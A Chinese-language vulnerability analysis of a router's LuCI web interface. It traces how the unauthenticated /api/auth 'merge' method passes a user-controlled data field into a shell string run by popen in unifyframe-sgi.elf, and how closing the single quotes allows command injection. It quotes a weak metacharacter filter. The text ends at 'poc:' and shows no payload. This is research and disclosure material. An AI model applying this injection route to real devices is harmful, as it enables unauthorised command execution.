<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line"><span class="built_in">module</span>(<span class="string">&quot;luci.controller.eweb.api&quot;</span>, <span class="built_in">package</span>.<span class="built_in">seeall</span>)</span><br><span class="line"><span class="comment">--该行用于定义模块，其全名为luci.controller.eweb.api，</span></span><br><span class="line"><span class="comment">--package.seeall是module的第二个参数设置模块的所有变量和函数为全局可见</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span></span></span><br><span class="line">    ...           <span class="comment">--luci.controller.eweb.api模块也就是该文件的入口点</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">rpc_auth</span><span class="params">()</span></span>  <span class="comment">--认证模块</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">rpc_common</span><span class="params">()</span></span>  <span class="comment">--通用模块</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"><span class="comment">--各种模块</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">openvpn</span><span class="params">()</span></span></span><br><span class="line">    <span class="keyword">end</span></span><br></pre></td></tr></table></figure>

<p><code>function index()</code>函数中的部分代码如下：</p>
<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line"><span class="keyword">local</span> api = node(<span class="string">&quot;api&quot;</span>) <span class="comment">--定义一个名为 api 的节点 </span></span><br><span class="line">api.sysauth = <span class="string">&quot;admin&quot;</span> <span class="comment">--设置该节点需要的系统认证角色为 admin</span></span><br><span class="line">api.sysauth_authenticator = authenticator <span class="comment">--将 authenticator 函数设置为该节点的认证函数</span></span><br><span class="line">api.notemplate = <span class="literal">true</span> <span class="comment">--设置该节点不使用模板</span></span><br><span class="line"><span class="comment">--定义具体的API路由</span></span><br><span class="line">    entry(&#123;<span class="string">&quot;api&quot;</span>, <span class="string">&quot;auth&quot;</span>&#125;, call(<span class="string">&quot;rpc_auth&quot;</span>), <span class="literal">nil</span>).sysauth = <span class="literal">false</span></span><br></pre></td></tr></table></figure>

<p><code>entry(&#123;&quot;api&quot;, &quot;auth&quot;&#125;, call(&quot;rpc_auth&quot;), nil).sysauth = false</code>表示当用户访问<code>/api/auth</code>路径时，会调用<code>rpc_auth()</code>函数。<code>sysauth</code>是LuCI框架中的一个属性，用于控制该路由是否需要系统认证，这里设置成了false表示不需要系统认证。</p>
<p>rpc_auth()函数：</p>
<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">rpc_auth</span><span class="params">()</span></span></span><br><span class="line">    <span class="comment">-- 加载模块</span></span><br><span class="line">    <span class="keyword">local</span> jsonrpc = <span class="built_in">require</span> <span class="string">&quot;luci.utils.jsonrpc&quot;</span></span><br><span class="line">    <span class="keyword">local</span> http = <span class="built_in">require</span> <span class="string">&quot;luci.http&quot;</span></span><br><span class="line">    <span class="keyword">local</span> ltn12 = <span class="built_in">require</span> <span class="string">&quot;luci.ltn12&quot;</span></span><br><span class="line">    <span class="keyword">local</span> _tbl = <span class="built_in">require</span> <span class="string">&quot;luci.modules.noauth&quot;</span> <span class="comment">-- _tbl是一个表，加载了模块中的函数作为表中内容</span></span><br><span class="line">    <span class="comment">-- 检查请求体大小</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">tonumber</span>(http.<span class="built_in">getenv</span>(<span class="string">&quot;HTTP_CONTENT_LENGTH&quot;</span>) <span class="keyword">or</span> <span class="number">0</span>) &gt; <span class="number">1000</span> <span class="keyword">then</span></span><br><span class="line">        http.prepare_content(<span class="string">&quot;text/plain&quot;</span>) <span class="comment">--设置HTTP的响应内容类型为text/plain</span></span><br><span class="line">        <span class="comment">-- http.write(&#123;code = &quot;1&quot;, err = &quot;too long data&quot;&#125;)</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;too long data&quot;</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    http.prepare_content(<span class="string">&quot;application/json&quot;</span>)</span><br><span class="line">    <span class="comment">-- 处理 JSON-RPC 请求</span></span><br><span class="line">    ltn12.pump.all(jsonrpc.handle(_tbl, http.source()), http.<span class="built_in">write</span>)</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>

<p>这一部分会先对HTTP请求头中的<strong>Content_Length</strong>字段也就是请求体的大小进行检查，如果没有超过1000字节便会设置响应内容类型为<strong>application&#x2F;json</strong>，然后处理JSON-RPC请求。<code>ltn12.pump.all(jsonrpc.handle(_tbl, http.source()), http.write)</code>中<code>http.source()</code>用于读取HTTP请求体中的数据，调用<code>jsonrpc.handle()</code>同时传入参数<code>_tbl</code>和<code>http.source()</code>对数据进行处理，然后将处理后的响应数据写入HTTP响应流中。</p>
<p>因为<code>jsonrpc.handle()</code>和<code>_tbl</code>分别来自<code>luci.utils.jsonrpc</code>和<code>luci.modules.noauth</code>，所以我们还要看看<code>jsonrpc.lua</code>（位于<code>/usr/lib/lua/luci/utils/jsonrpc.lua</code>）和<code>noauth.lua</code>（位于<code>/usr/lib/lua/luci/modules/noauth.lua</code>）这两个文件。</p>
<h3 id="jsonrpc-lua文件"><a href="#jsonrpc-lua文件" class="headerlink" title="jsonrpc.lua文件"></a>jsonrpc.lua文件</h3><p>定位到其handle()函数：</p>
<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">handle</span><span class="params">(tbl, rawsource, ...)</span></span></span><br><span class="line">    <span class="comment">-- 用于将原始的HTTP请求数据传输到一个JSON解码器中，解析成JSON对象，解析成功stat为true</span></span><br><span class="line">    <span class="keyword">local</span> stat, err = luci.ltn12.pump.all(rawsource, decoder:sink())</span><br><span class="line">    <span class="keyword">local</span> json = decoder:get()</span><br><span class="line">    <span class="keyword">if</span> stat <span class="keyword">then</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">type</span>(json.method) == <span class="string">&quot;string&quot;</span> <span class="keyword">then</span> <span class="comment">--检查请求中的method字段是否为字符串,是则执行resolve()函数</span></span><br><span class="line">            <span class="keyword">local</span> method = resolve(tbl, json.method)<span class="comment">--一个包含可调用方法的表（table），这些方法将被JSON-RPC请求调用</span></span><br><span class="line">            <span class="keyword">if</span> method <span class="keyword">then</span></span><br><span class="line">                response = reply(json.jsonrpc, json.id, proxy(method, json.params <span class="keyword">or</span> &#123;&#125;))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> luci.json.Encoder(response, ...):source()</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>

<p>这段代码用于处理JSON-RPC请求，具体来说，它处理了请求中的<code>method</code>字段，查找并调用对应的方法，并生成响应。具体过程如下，如果从HTTP请求体中读取的JSON数据解析成功，会检查JSON-RPC请求中的method字段（表示要调用的方法名）是否为字符串(string)。</p>
<p><strong>由此暂可推断出数据报的格式如下：</strong></p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;method&quot;</span><span class="punctuation">:</span><span class="string">&quot;xxx&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>json.method是字符串后，接着看<code>resolve</code>函数，参数<code>method</code>是数据报中的method字段，<strong>mod是传入的<code>tbl</code>（<code>api.lua</code>中的<code>_tbl</code>），<code>tbl</code>是一个表，表中内容为<code>luci.modules.noauth</code>模块里的函数名。</strong></p>
<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">resolve</span><span class="params">(mod, method)</span></span><span class="comment">--mod中有 singleLogin,login,merge,checkNet</span></span><br><span class="line">    <span class="keyword">local</span> <span class="built_in">path</span> = luci.util.split(method, <span class="string">&quot;.&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> j = <span class="number">1</span>, #<span class="built_in">path</span> - <span class="number">1</span> <span class="keyword">do</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">type</span>(<span class="built_in">mod</span>) == <span class="string">&quot;table&quot;</span> <span class="keyword">then</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">        <span class="built_in">mod</span> = <span class="built_in">rawget</span>(<span class="built_in">mod</span>, <span class="built_in">path</span>[j])</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">mod</span> <span class="keyword">then</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    <span class="built_in">mod</span> = <span class="built_in">type</span>(<span class="built_in">mod</span>) == <span class="string">&quot;table&quot;</span> <span class="keyword">and</span> <span class="built_in">rawget</span>(<span class="built_in">mod</span>, <span class="built_in">path</span>[#<span class="built_in">path</span>]) <span class="keyword">or</span> <span class="literal">nil</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">type</span>(<span class="built_in">mod</span>) == <span class="string">&quot;function&quot;</span> <span class="keyword">then</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">mod</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>

<p><strong><code>resolve</code>函数的作用是根据报文的<code>method</code>字段从<code>mod</code>表中返回一个函数对象，该函数对象有四个选择分别为<code>singleLogin,login,merge,checkNet</code>。</strong></p>
<p><code>resolve</code>函数执行后，接着执行<code>reply</code>函数。由于<code>reply()</code>的参数调用了<code>proxy(method, json.params or &#123;&#125;)</code>，我们先来看<code>proxy</code>函数，这个函数的作用是调用目标方法(<code>method</code>)，也就是<code>json.method</code>，而<code>json.params</code>最终会是目标方法的参数即<code>params</code>。</p>
<h3 id="json-method"><a href="#json-method" class="headerlink" title="json.method"></a>json.method</h3><p>json.method可选值一共有login、singleLogin、merge和checkNet四个函数，其中<code>singleLogin()</code>无参数；<code>checkNet()</code>中<code>params.host</code>是可控的，且其被拼接到了命令执行字符串中，但在此之前<code>tool.checkIp(params.host)</code>会对params.host进行正则匹配检查是否符合IP地址格式。</p>
<p>直接在luci.utils.tool（<code>./usr/lib/lua/luci/utils/tool.lua</code>）中可以看到checkIp()：</p>
<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkIp</span><span class="params">(str)</span></span></span><br><span class="line">    <span class="comment">-- 放宽IP校验(tipcIp需要)</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">string</span>.<span class="built_in">len</span>(str) &lt; <span class="number">50</span> <span class="keyword">and</span> <span class="built_in">string</span>.<span class="built_in">match</span>(str, <span class="string">&quot;^[\.%d:%a]+$&quot;</span>) ~= <span class="literal">nil</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>

<h4 id="login"><a href="#login" class="headerlink" title="login()"></a>login()</h4><p>接着分析<code>login()</code>其中有<code>params.password</code>、<code>params.encry</code>和<code>params.limit</code>三个可利用字段，不过也会有<code>tool.includeXxs()</code>对params.password进行检查，然后会调用<code>tool.checkPasswd(checkStat)</code>。</p>
<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">login</span><span class="params">(params)</span></span></span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">local</span> tool = <span class="built_in">require</span>(<span class="string">&quot;luci.utils.tool&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> params.password <span class="keyword">and</span> tool.includeXxs(params.password) <span class="keyword">then</span></span><br><span class="line">        tool.eweblog(<span class="string">&quot;INVALID DATA&quot;</span>, <span class="string">&quot;LOGIN FAILED&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">local</span> checkStat = &#123;</span><br><span class="line">        password = params.password,</span><br><span class="line">        username = <span class="string">&quot;admin&quot;</span>, <span class="comment">-- params.username,</span></span><br><span class="line">        encry = params.encry,</span><br><span class="line">        limit = params.limit</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">local</span> authres, reason = tool.checkPasswd(checkStat)</span><br><span class="line">    ...</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>

<p>定位到tool.includeXxs()，如下：</p>
<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">includeXxs</span><span class="params">(str)</span></span></span><br><span class="line">    <span class="keyword">local</span> ngstr = <span class="string">&quot;[`&amp;$;|]&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">string</span>.<span class="built_in">match</span>(str, ngstr) ~= <span class="literal">nil</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>

<p>可知，<code>tool.includeXxs(params.password)</code>会对<code>params.password</code>进行一些与命令执行有关的危险字符过滤，但<strong>没有过滤<code>\n</code>这个命令分隔符</strong>。</p>
<p>继续定位到tool.checkPasswd()，如下：</p>
<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkPasswd</span><span class="params">(checkStat)</span></span></span><br><span class="line">    <span class="keyword">local</span> cmd = <span class="built_in">require</span>(<span class="string">&quot;luci.modules.cmd&quot;</span>)</span><br><span class="line">    <span class="keyword">local</span> _data = &#123;</span><br><span class="line">        <span class="built_in">type</span> = checkStat.encry <span class="keyword">and</span> <span class="string">&quot;enc&quot;</span> <span class="keyword">or</span> <span class="string">&quot;noenc&quot;</span>,<span class="comment">--checkStat.encry为true则type为enc,为flase则type为noenc</span></span><br><span class="line">        password = checkStat.password,</span><br><span class="line">        name = checkStat.username,</span><br><span class="line">        limit = checkStat.limit <span class="keyword">and</span> <span class="string">&quot;true&quot;</span> <span class="keyword">or</span> <span class="literal">nil</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">local</span> _check = cmd.devSta.get(&#123;<span class="built_in">module</span> = <span class="string">&quot;adminCheck&quot;</span>, device = <span class="string">&quot;pc&quot;</span>, data = _data&#125;)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">type</span>(_check) == <span class="string">&quot;table&quot;</span> <span class="keyword">and</span> _check.result == <span class="string">&quot;success&quot;</span> <span class="keyword">then</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>, _check.reason</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>

<p>可知，在<code>_data</code>表中<code>type</code>和<code>limit</code>会根据params.encry和params.limit的值被赋予固定的字符串，<code>name</code>也是一个固定值为<code>admin</code>，此时便只剩<code>password</code>即params.password这一个可控参数。然后继续调用<code>cmd.devSta.get()</code>进行操作。</p>
<p>定位到cmd.devSta.get()（位于<code>./usr/lib/lua/luci/modules/cmd.lua</code>）：</p>
<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line"><span class="keyword">local</span> opt = &#123;<span class="string">&quot;add&quot;</span>, <span class="string">&quot;del&quot;</span>, <span class="string">&quot;update&quot;</span>, <span class="string">&quot;get&quot;</span>, <span class="string">&quot;set&quot;</span>, <span class="string">&quot;clear&quot;</span>, <span class="string">&#x27;doc&#x27;</span>&#125;</span><br><span class="line">acConfig, devConfig, devSta, devCap = &#123;&#125;, &#123;&#125;, &#123;&#125;, &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> i = <span class="number">1</span>, #opt <span class="keyword">do</span></span><br><span class="line">    ...</span><br><span class="line">    devSta[opt[i]] = <span class="function"><span class="keyword">function</span><span class="params">(params)</span></span></span><br><span class="line">        <span class="keyword">local</span> model = <span class="built_in">require</span> <span class="string">&quot;dev_sta&quot;</span></span><br><span class="line">        params.method = opt[i]</span><br><span class="line">        params.cfg_cmd = <span class="string">&quot;dev_sta&quot;</span></span><br><span class="line">        <span class="keyword">local</span> data, back, ip, password, shell = doParams(params)</span><br><span class="line">        <span class="keyword">return</span> fetch(model.fetch, shell, params, opt[i], params.<span class="built_in">module</span>, data, back, ip, password)</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    ...</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>

<p>在cmd.devSta.get()中会通过<code>doParams</code>函数对传入的<code>Json</code>参数进行解析，将其中的<code>data</code>等字段分离出来，传入<code>fetch</code>函数做进一步处理。</p>
<blockquote>
<p>而<code>doParams</code>函数中对<code>data</code>字段进行提取的时候，用到了<code>luci.json.encode</code>函数。这里的<code>data</code>字段就是上述<code>checkPasswd</code>函数中传入<code>devSta.get</code>作为<code>Json</code>参数的<code>_data</code>的内容，我们的疑似注入点<code>password</code>字段就在其中。<strong>此处的<code>luci.json.encode</code>函数会对<code>\n</code>（即<code>\u000a</code>）类字符进行转义，也就不会被解析成换行符了</strong>，不论我们后续再如何传参，这个疑似的漏洞点已经被封堵住了。</p>
</blockquote>
<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> params.data <span class="keyword">then</span></span><br><span class="line">    data = luci.json.encode(params.data)</span><br><span class="line">    _shell = _shell .. <span class="string">&quot; &#x27;&quot;</span> .. data .. <span class="string">&quot;&#x27;&quot;</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>

<h4 id="merge"><a href="#merge" class="headerlink" title="merge()"></a>merge()</h4><p>这个函数很简单，就调用了<code>cmd.devSta.set()</code>，且整个<code>merge.params</code>(<code>json.params</code>)参数都可控制也无任何过滤。</p>
<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 网络合并</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">merge</span><span class="params">(params)</span></span><span class="comment">-- params就是传入的json.params</span></span><br><span class="line">    <span class="keyword">local</span> cmd = <span class="built_in">require</span> <span class="string">&quot;luci.modules.cmd&quot;</span></span><br><span class="line">    <span class="keyword">return</span> cmd.devSta.set(&#123;device = <span class="string">&quot;pc&quot;</span>, <span class="built_in">module</span> = <span class="string">&quot;networkId_merge&quot;</span>, data = params, async = <span class="literal">true</span>&#125;) <span class="comment">-- data是json.params</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>

<p><code>cmd.devSta.set()</code>中，<code>doParams()</code>执行完得到的data是<code>json.params.data</code>，接着会执行<code>fetch()</code>。</p>
<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line">devSta[opt[i]] = <span class="function"><span class="keyword">function</span><span class="params">(params)</span></span></span><br><span class="line">        <span class="keyword">local</span> model = <span class="built_in">require</span> <span class="string">&quot;dev_sta&quot;</span></span><br><span class="line">        params.method = opt[i]</span><br><span class="line">        params.cfg_cmd = <span class="string">&quot;dev_sta&quot;</span></span><br><span class="line">        <span class="keyword">local</span> data, back, ip, password, shell = doParams(params)</span><br><span class="line">        <span class="keyword">return</span> fetch(model.fetch, shell, params, opt[i], params.<span class="built_in">module</span>, data, back, ip, password)</span><br><span class="line">    <span class="keyword">end</span> <span class="comment">-- deSta.data =&gt; json.params.data</span></span><br></pre></td></tr></table></figure>

<p>接着看cmd.fetch()，这个函数会调用<code>model.fetch</code>(<code>dev_sta.fetch()</code>)函数也就是传入其自身的第一个参数，而参数就是自身参数中的除前三个以外的参数，其中有可控data字段。</p>
<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- return fetch(model.fetch, shell, params, opt[i], params.module, data, back, ip, password)</span></span><br><span class="line"><span class="keyword">local</span> <span class="function"><span class="keyword">function</span> <span class="title">fetch</span><span class="params">(fn, shell, params, ...)</span></span></span><br><span class="line">    <span class="built_in">require</span> <span class="string">&quot;luci.json&quot;</span></span><br><span class="line">    <span class="keyword">local</span> tool = <span class="built_in">require</span> <span class="string">&quot;luci.utils.tool&quot;</span></span><br><span class="line">    <span class="keyword">local</span> _start = <span class="built_in">os</span>.<span class="built_in">time</span>()</span><br><span class="line">    <span class="keyword">local</span> _res = fn(...)</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure>

<p><code>dev_sta.fetch()</code>（位于<code>/usr/lib/lua/dev_sta.lua</code>）中对一些字段进行了重新赋值，最后调用了<code>client_call</code>函数，位于<code>/usr/lib/lua/libuflua.so</code>文件。</p>
<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fetch</span><span class="params">(cmd, module, param, back, ip, password, force, not_change_configId, multi)</span></span></span><br><span class="line"><span class="keyword">local</span> uf_call = <span class="built_in">require</span> <span class="string">&quot;libuflua&quot;</span></span><br><span class="line">...</span><br><span class="line"><span class="keyword">local</span> stat = uf_call.client_call(ctype, cmd, <span class="built_in">module</span>, param, back, ip, password, force, not_change_configId, multi)</span><br></pre></td></tr></table></figure>

<h3 id="libuflua-so文件"><a href="#libuflua-so文件" class="headerlink" title="libuflua.so文件"></a>libuflua.so文件</h3><p>libuflua.so是一个二进制文件，用IDA打开直接查找client_call函数，没有找到，有<code>uf_client_call</code>函数，</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202504272146446.png" alt="202504081952215"></p>
<p><code>shift+f12</code>搜索字符串，也只有<code>uf_client_call</code></p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202504272145928.png" alt="image-20250408195528076" style="zoom:50%;" />

<p>这里有一个解释就是IDA没有把<code>client_call</code>解析成字符串，而是解析成了代码。那我们可以用<code>010Editor</code>打开该文件，搜索字符串<code>client_call</code>，发现其地址为<code>0xff0</code></p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202504272145915.png" alt="image-20250408200411164" style="zoom:67%;" />

<p>然后在IDA中定位到<code>0xff0</code>地址，选中左边的地址，然后按A，就能以字符串的形式呈现了，如下</p>
<p>、<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202504272144513.png" alt="image-20250408201016082"></p>
<p>选中<code>client_call</code>进行交叉引用跳到如下之处</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202504272144662.png" alt="image-20250408202529406"></p>
<p>通过<code>DATA XREF</code>数据交叉引用提示可以知道，该数据从<code>luaopen_libuflua</code>函数的起始地址偏移<code>2C</code>字节处被引用，定位到该函数如下</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202504272143942.png" alt="image-20250408203414524"></p>
<p>这段代码的作用是将扩展库<code>libuflua</code>注册到Lua环境中</p>
<p>在文件系统中搜索<code>uf_client_call</code>字符串，结合出现过其的二进制文件和<code>libuflua.so</code>文件所依赖的共享库，可以发现<code>uf_client_call</code>函数定义在<code>/usr/lib/libunifyframe.so</code>中</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202504272144234.png" alt="image-20250408205758936" style="zoom: 67%;" />

<h3 id="libunifyframe-so文件"><a href="#libunifyframe-so文件" class="headerlink" title="libunifyframe.so文件"></a>libunifyframe.so文件</h3><p>用IDA打开<code>libunifyframe.so</code>文件，对<code>uf_client_call</code>函数进行分析，可知传进来的各个字段会被解析成JSON字符串，作为键值与自定义的键以键值对的形式添加到JSON对象中，然后JSON对象会被转换成JSON格式的字符串，通过<code>uf_socket_msg_write</code>用<code>socket</code>套接字进行数据传输。</p>
<blockquote>
<p>既然这里采用<code>uf_socket_msg_write</code>进行数据发送，那么肯定有某个地方<strong>会使用<code>uf_socket_msg_read</code>进行数据接收</strong>，再进一步处理。匹配一下，一共三个文件，很容易锁定<code>/usr/sbin/unifyframe-sgi.elf</code>文件。又发现在初始化脚本<code>/etc/init.d/unifyframe-sgi</code>中，启动了<code>unifyframe-sgi.elf</code>，即<strong>说明<code>unifyframe-sgi.elf</code>一直挂在进程中</strong>。因此，我们可以确定<code>unifyframe-sgi.elf</code>就是接收<code>libunifyframe.so</code>所发数据的文件（这里采用了<code>Ubus</code>总线进行进程间通信）。</p>
</blockquote>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202504272143370.png" alt="image-20250409142447149" style="zoom: 67%;" />

<h2 id="分析二进制文件"><a href="#分析二进制文件" class="headerlink" title="分析二进制文件"></a>分析二进制文件</h2><p>在unifyframe-sgi.elf文件中定位到<code>uf_socket_msg_read</code>函数开始分析。<code>uf_socket_msg_read(*v29, v31 + 1);</code>中的两个参数第一个是文件描述符（ida分析libunifyframe.so文件），第二个是接收数据存储的位置（这个要动态调试对比uf_socket_msg_read函数执行前后a2寄存器存储的地址里的内容）</p>
<p>之后解析字段<strong>、</strong>执行具体操作的两个函数分别为 <code>parse_content</code>和<code>add_pkg_cmd2_task</code>，如下：</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202504272144357.png" alt="QQ_1745750405617" style="zoom:50%;" />

<p>根据对<code>parse_content</code>的分析可知，具体进行数据解析的位置应该是<code>parse_obj2_cmd</code>函数</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202504272144239.png" alt="image-20250427184613995" style="zoom:50%;" />

<p><code>parse_obj2_cmd</code> 函数结束后，会执行 <code>pkg_add_cmd(a1, v16)</code> ，它的核心作用就是在 <code>a1</code> 这个数据结构中记录了 <code>v16</code> 的指针，使得后续操作通过 <code>a1</code> 访问到刚刚解析出来的各个字段。</p>
<p>在<code>ufm_handle</code>函数中，由于我们是<code>set</code>方式，因此会调用到<code>sub_410140</code>函数。进入<code>sub_410140</code>函数，首先<code>sn</code>字段为空的条件满足，跳转到<code>LABEL_36</code>，<code>LABEL_36</code>处会调用到<code>sub_40DA38</code>函数。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">v6 = json_object_object_get(a1[<span class="number">22</span>], <span class="string">&quot;sn&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> ( !v6 )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_36;</span><br><span class="line">...</span><br><span class="line">LABEL_36:</span><br><span class="line">  ...</span><br><span class="line">  v5 = sub_40DA38(a1, a1 + <span class="number">21</span>, <span class="number">0LL</span>, <span class="number">0LL</span>);</span><br></pre></td></tr></table></figure>

<p>在<code>sub_40DA38</code>函数中，定位到下面这一处，<code>v5</code>和<code>v6</code>分别是<code>a3</code>和<code>a4</code>，因为传入的值均为零，所以会进入<code>else</code>分支，这里会将<code>data</code>字段的内容拼接到两个单引号内。此处<code>v4</code>字符串形如<code>/usr/sbin/module_call set networkId_merge &#39;xxx&#39;</code>，很显然是一个命令，并且单引号内的内容我们可控，所以我们只需要左右分别闭合单引号，中间注入恶意命令，并用分隔符隔开即可完成命令注入。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">LODWORD(v5) = a3;</span><br><span class="line">v6 = a4;</span><br><span class="line">...</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    v84 = <span class="built_in">snprintf</span>(</span><br><span class="line">        v4,</span><br><span class="line">        v75,</span><br><span class="line">        <span class="string">&quot;/usr/sbin/module_call %s %s&quot;</span>,</span><br><span class="line">        *((<span class="type">const</span> <span class="type">char</span> **)v7 + <span class="number">5</span>),</span><br><span class="line">        (<span class="type">const</span> <span class="type">char</span> *)(*((_QWORD *)v7 + <span class="number">23</span>) + <span class="number">16LL</span>));</span><br><span class="line">    v85 = &amp;v4[v84];</span><br><span class="line">    v86 = (<span class="type">const</span> <span class="type">char</span> *)*((_QWORD *)v7 + <span class="number">19</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v86 )</span><br><span class="line">        v85 += <span class="built_in">snprintf</span>(&amp;v4[v84], v75, <span class="string">&quot; &#x27;%s&#x27;&quot;</span>, v86);</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>接着，由之前的分析，此处<code>v7</code>偏移<code>8</code>的位置为<code>0</code>（<code>async</code>不是<code>false</code>），故进入<code>else</code>分支，其中会将<code>v4</code>传入<code>ufm_commit_add</code>函数，作为第二个参数，然后继续进入<code>async_cmd_push_queue</code>函数。此处，<code>a1</code>为<code>0</code>，将<code>a2</code>存入<code>v4</code>偏移<code>6\*8</code>字节处，然后跳转到<code>LABEL_34</code>的位置。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ( !a1 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( a2 )</span><br><span class="line">    &#123;</span><br><span class="line">      v19 = strdup(a2);</span><br><span class="line">      *(v7 + <span class="number">28</span>) = v19;</span><br><span class="line">      <span class="keyword">if</span> ( v19 )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_34;</span><br></pre></td></tr></table></figure>

<p>在<code>LABEL_34</code>处，会释放一个信号量，信号量的地址是<code>&amp;unk_4360A8</code>，对该地址进行交叉引用可以定位到<code>sub_41AFC8</code>函数，在该函数中会调用一个<code>sub_41ADF0</code>函数。</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202504272144487.png" alt="image-20250427191456589" style="zoom:50%;" />

<p>在<code>sub_41ADF0</code>函数中，<code>a1</code>偏移<code>32</code>的位置存储的值为<code>0</code>。因此，会将<code>a1+13</code>处的数据也就是命令执行字符串作为<code>popen</code>的参数执行，且没有任何过滤。</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202504272144001.png" alt="image-20250427192057384" style="zoom: 33%;" />

<p>poc：</p>
